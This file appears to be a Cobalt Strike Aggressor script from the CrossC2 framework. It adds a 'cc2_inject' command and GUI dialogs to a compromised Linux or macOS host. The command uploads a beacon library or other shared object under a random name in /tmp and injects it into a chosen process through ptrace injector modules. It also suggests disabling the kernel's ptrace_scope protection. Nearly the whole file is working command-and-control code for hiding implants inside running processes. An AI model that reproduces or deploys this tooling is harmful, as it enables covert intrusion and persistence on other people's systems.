
sub bcc2_inject_cb {
    local('$taskName $taskType $taskResType');
    local('$injectMOD $inject_PID $injectObjectPath');
    local('$bid $args $transportArg');
    $taskName = "cc2_inject"; # taskName
    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib 
    $taskResType = "info"; # info -> normal message

    $bid = $1;
    $args = $2;
    $injectMOD = $args[0];
    $inject_PID = $args[1];
    $injectObjectPath = $args[2];
    $transportArg = 'bash^'.$injectObjectPath.'^'.$inject_PID;
    $transportArg = $injectObjectPath.'^'.$inject_PID;
    btask($bid, "[cc2_inject]: use MOD -> ".$injectMOD);
    bcrossc2_load_dyn($bid, $taskType, $taskName, $taskResType, $injectMOD, $transportArg);
}

sub bcc2_inject {
    local('$bid $inject_PID $inject_Data $savepath $savename $injectObjectPath');
    local('$bd $os $arch $injectMOD');
    # bcc2_inject($bid, $pid, $file, $temp_file_workpath);
    #   -> check_os_arch($bid)
    # shell rm $temp_file_workpath+random(8)
    $bid = $1;
    $inject_PID = $2;
    $inject_Data = $3;
    $savepath = $4;
    $savename = random_string(8);
    if ($savepath eq '') {
        $savepath = '/tmp/';
    }
    $injectObjectPath = $savepath.'/'.$savename;

    $bd = bdata($bid);
    $os = lc(beacon_info($bid, "os"));
    $arch = beacon_info($bid, "arch");
    $injectMOD = $null;

    binput($bid, "cc2_inject $inject_PID libbeacon $savepath");
    btask($bid, "[cc2_inject]: [tips]: [if ptrace attach failed]: echo 0 > /proc/sys/kernel/yama/ptrace_scope");

    if ('linux' isin $os) {
        if ($arch eq 'x86') {
            $injectMOD = 'process/libinject32.so';
        } else if ($arch eq 'x64') {
            $injectMOD = 'process/libinjector64.so';
        }
    } else if ('macos' isin $os) {
        $injectMOD = 'process/libinject.dylib';
    }

    if ($injectMOD) {
        btask($bid, "[cc2_inject]: inject ".$injectObjectPath." to pid-[".$inject_PID."]");
        bawait_upload_raw($bid, $inject_Data, $savepath, $savename, &bcc2_inject_cb, @($injectMOD, $inject_PID, $injectObjectPath));
    } else {
        berror($bid, "[cc2_inject]: unknow platform");
    }
}

sub cc2_inject {
    local('$bid $pid $file $temp_file_workpath $handle $fileData');
    $bid = $1;
    $pid = $2;
    $file = $3;
    if (-exists script_resource($3)) { 
        $file = script_resource($3);
    }
    $handle = openf($loadFilePath);
    $fileData = readb($handle, -1);
    closef($handle);

    $temp_file_workpath = $4;
    if ($temp_file_workpath eq $null) { 
        $temp_file_workpath = '/tmp/';
    }
    bcc2_inject($bid, $pid, $fileData, $temp_file_workpath);
}

ssh_alias("cc2_inject", &cc2_inject);

ssh_command_register("cc2_inject", "CrossC2 process inject", "\nUsage: cc2_inject PID lib_file_path workpath\n\tcc2_inject 1524 c:\\libtest.so /tmp/\n");

popup processbrowser {
    separator();
    menu "&CC2ProcessHelper" {
        item "&inject" { injectDialog($1, $2); }
    }
}
sub injectDialogCallBack {
    local('$listener $bid $targetLines $libbeaconData $workspace');
    $listener = $3['listener'];
    $bid = $3['bid'];
    $workspace = $3['workspace'];
    $injectPID = $3['injectPID'];
    # get libbeaconData from CrossC2 listener
    $libbeaconData = getCrossC2Beacon($listener, 'lib');
    bcc2_inject($bid, $injectPID, $libbeaconData, $workspace);
}

sub injectDialog {
    local('%beaconListenerMap @beaconListenerMenu');
    %beaconListenerMap = getCrossC2Listener();
    @beaconListenerMenu = @();
    foreach $key => $value (%beaconListenerMap) {
        add(@beaconListenerMenu, $value[0]);
    }
    $bid = $1;
    $injectPID = $2[0]['PID'];
    $dialog = dialog("Choose inject Listener", %(bid => $bid, injectPID => $injectPID, listener => $null, workspace => "/tmp/"), &injectDialogCallBack);
    drow_text($dialog, "workspace", "workspace: ", 20);
    drow_combobox($dialog, "listener", "CrossC2 Listener: ", @beaconListenerMenu);

    dbutton_action($dialog, "inject");
    dialog_show($dialog);
} 


sub openInjectDialogCallBack {
    local('$bid $f_server_lh $f_server_lp $f_token $protocol $s5_username $s5_password $s5_port');
    local('$os $arch $system');
    $listener = $3['listener'];
    $bid = $3['bid'];
    $workspace = $3['workspace'];
    $injectPID = $3['injectPID'];
    $lib_file = $3['libFile'];

    if ($listener) {
        $libbeaconData = getCrossC2Beacon($listener, 'lib');
        bcc2_inject($bid, $injectPID, $libbeaconData, $workspace);
    } else if ($lib_file) {
        cc2_inject($bid, $injectPID, $lib_file, $workspace);
    }
}

sub openInjectDialog {
    local('$bid $dialog');
    $bid = $1;
    local('%beaconListenerMap @beaconListenerMenu');
    %beaconListenerMap = getCrossC2Listener();
    @beaconListenerMenu = @();
    foreach $key => $value (%beaconListenerMap) {
        add(@beaconListenerMenu, $value[0]);
    }
    add(@beaconListenerMenu,"null");
    $dialog = dialog("ProcessInject", %(bid => $bid[0], injectPID => "", workspace => "/tmp/", lib_file => $null, listener => $null), &openInjectDialogCallBack);
    dialog_description($dialog, "Inject dynamic library file or CrossC2 listener");

    drow_text($dialog, "injectPID", "inject PID: ", 20); 
    drow_text($dialog, "workspace", "workspace: ", 20);
    drow_file($dialog, "lib_file", "Choose: dynamic library file");
    drow_combobox($dialog, "listener", "CrossC2 Listener: ", @beaconListenerMenu);
    dbutton_action($dialog, "run");
    dialog_show($dialog);
}

sub cc2_inject_status {
    local('$bid $os $arch $system');
    $bid = $1;
    $os = lc(beacon_info($bid, "os"));
    $arch = beacon_info($bid, "arch");
    if ('linux' isin $os) {
        if ($arch eq 'x64') {
            return 'Linux64';
        }
    }
    return '';
}